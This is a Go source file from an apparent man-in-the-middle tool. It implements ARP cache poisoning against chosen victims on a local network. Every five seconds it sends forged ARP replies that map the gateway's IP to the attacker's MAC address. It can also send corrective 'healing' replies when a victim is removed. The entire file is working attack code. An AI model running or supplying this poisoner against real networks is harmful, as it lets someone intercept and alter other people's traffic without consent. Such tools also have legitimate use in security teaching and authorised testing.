package poisoner

import (
	"MITM/arp"
	"MITM/iface"
	"github.com/google/gopacket/pcap"
	"net"
	"time"
)

const (
	timeBetweenARPMessages = 5 * time.Second
)

type Poisoner struct {
	iface      iface.Iface
	handle     *pcap.Handle
	gatewayMAC net.HardwareAddr
	// Note that we have to store the IP as a string in order to use it as key
	victimMACByIp map[string]net.HardwareAddr
}

func NewPoisoner(iface iface.Iface, gatewayMAC net.HardwareAddr) *Poisoner {
	handle := iface.GetHandle()

	poisoner := &Poisoner{
		iface,
		handle,
		gatewayMAC,
		make(map[string]net.HardwareAddr),
	}

	return poisoner
}

func (poisoner *Poisoner) Run() {
	for {
		poisoner.poisonAllVictims()
		time.Sleep(timeBetweenARPMessages)
	}
}

func (poisoner *Poisoner) AddVictim(targetIP net.IP, victimMAC net.HardwareAddr) {
	poisoner.victimMACByIp[targetIP.String()] = victimMAC
	poisoner.sendPoisonARP(targetIP, victimMAC)
}

func (poisoner *Poisoner) RemoveVictim(victimIP net.IP, victimMAC net.HardwareAddr) {
	delete(poisoner.victimMACByIp, victimIP.String())
	poisoner.sendHealingARP(victimIP, victimMAC)
}

func (poisoner *Poisoner) poisonAllVictims() {
	for victimIPAsString, victimMAC := range poisoner.victimMACByIp {
		victimIP := net.ParseIP(victimIPAsString)[12:]

		poisoner.sendPoisonARP(victimIP, victimMAC)
	}
}

func (poisoner *Poisoner) sendPoisonARP(victimIP net.IP, victimMAC net.HardwareAddr) {
	gatewayIP := poisoner.iface.GatewayIP
	ourMAC := poisoner.iface.HardwareAddr

	arpPacket := arp.GetARPReplyPacket(gatewayIP, ourMAC, victimIP, victimMAC)
	err := poisoner.handle.WritePacketData(arpPacket)
	if err != nil {
		panic(err)
	}
}

func (poisoner *Poisoner) sendHealingARP(victimIP net.IP, victimMAC net.HardwareAddr) {
	gatewayIP := poisoner.iface.GatewayIP
	gatewayMAC := poisoner.gatewayMAC

	arpPacket := arp.GetARPReplyPacket(gatewayIP, gatewayMAC, victimIP, victimMAC)
	err := poisoner.handle.WritePacketData(arpPacket)
	if err != nil {
		panic(err)
	}
}
